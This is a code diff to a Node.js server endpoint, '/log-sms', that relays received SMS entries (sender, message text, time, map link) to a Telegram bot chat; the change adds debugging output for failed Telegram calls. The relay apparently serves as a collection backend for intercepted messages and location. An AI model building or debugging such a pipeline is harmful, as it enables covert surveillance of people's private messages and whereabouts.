@@ -47,17 +47,24 @@ app.post('/log-sms', async (req, res) => {
                           `💬 *Message:* ${newEntry.message}\n` +
                           `⏰ *Time:* ${newEntry.time}` + mapUrl;
 
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        console.log(`[Server] Sending to Telegram: ${telegramMsg}`);
+        const telegramResponse = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: telegramMsg,
             parse_mode: 'Markdown'
         });
+        console.log(`[Server] Telegram Response:`, telegramResponse.data);
 
         console.log(`[✓] Data sent to Telegram from ${newEntry.sender}`);
         res.status(200).json({ status: 'success' });
 
     } catch (error) {
-        console.error('Error Details:', error.response ? error.response.data : error.message);
+        console.error('[Server] Error Details:', error.response ? error.response.data : error.message);
+        console.error('[Server] Full Error:', error);
+        // Handle common issues
+        if (error.code === 'ENOTFOUND' || error.message.includes('Network Error')) {
+          console.warn('[Server] Possible issues: Wrong Telegram token/CHAT_ID, network issues, or Telegram API down.');
+        }
         res.status(500).json({ status: 'error' });
     }
 });
